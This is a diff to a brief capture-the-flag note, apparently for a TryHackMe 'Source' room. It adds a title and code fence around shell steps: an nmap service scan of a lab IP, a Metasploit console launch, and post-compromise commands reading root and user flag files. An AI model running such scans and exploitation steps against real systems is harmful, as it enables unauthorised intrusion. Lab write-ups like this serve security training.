@@ -1,3 +1,6 @@
+# THM - Source
+
+```shell
 nmap -sV -sC -oA scans/initial-scan 10.10.140.48
 
 msfconsole
@@ -11,5 +14,5 @@ msfconsole
 			whoami
 			cat /root/root.txt
 			cat /home/dark/user.txt
-			
+```
 	
